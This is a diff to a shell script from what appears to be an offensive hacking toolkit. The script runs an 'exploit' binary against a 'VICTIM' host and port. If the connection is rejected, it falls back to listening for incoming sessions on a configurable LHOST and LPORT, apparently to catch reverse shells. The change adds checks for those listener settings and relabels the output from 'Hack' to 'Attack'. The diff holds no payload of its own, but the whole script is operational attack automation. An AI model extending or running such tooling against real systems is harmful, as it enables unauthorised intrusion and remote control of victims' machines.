@@ -32,26 +32,33 @@ if   [ "$VICTIM" == '0.0.0.0' ] || [ "$VICTIM" == '' ];then
 elif [ "$PORT" == '' ];then
   cerr Error Target Port is not Defined, Execute info victim
   exit 1
+elif [ "$LHOST" == '' ];then
+  cerr "Error Your LHOST Not Set, The Host We Should Listen On For Incoming Sessions, Execute show options, Execute info lset"
+  exit
+elif [ "$LPORT" == '' ];then
+  cerr "Error Your LPORT Not Set, The Port We Should Listen On For Incoming Sessions, Execute show options, Execute info lset"
+  exit
 fi
-cout Starting Hack...
+cout Starting Attack...
 sleep 0.5
-cout Automating Binaries....
+cout This is an Automated Attack Section....
 sleep 0.3
-printf "${green}☢ Trying$white to ${red}connect${white} With ${red}$VICTIM ${white}Port$red $PORT \n"
-
+printf "${green}☢ Trying$white to ${red}connect${white} With ${red}$VICTIM ${white}Port$red $PORT $purple\n"
+sleep 0.1
 $PODGL/bin/exploit connect $VICTIM $PORT
 if [ "$?" == 2 ];then
 
   sleep 0.4
   cerr Connection Request Rejected..!
   sleep 0.4
-  printf "${green}☢ ${cyan}Listening on port $red$PORT$cyan For Incoming Sessions.... $purple(Press CTRL+C To Stop)\n"
+  printf "${green}☢ ${cyan}Listening on port $red$PORT$cyan For Incoming Sessions.... $purple(Press CTRL+C To Stop) (It Take 1 Minute Maximum)\n"
 
-  $PODGL/bin/exploit listen 0.0.0.0 $PORT
+  $PODGL/bin/exploit listen $LHOST $LPORT
   if [ "$?" == 4 ];then
      sleep 0.3
      cerr An Error Was Occured, Maybe Another Proccess is Using This Address
   fi
+  cout "Attack Finished"
 fi
 else
 $1 $2
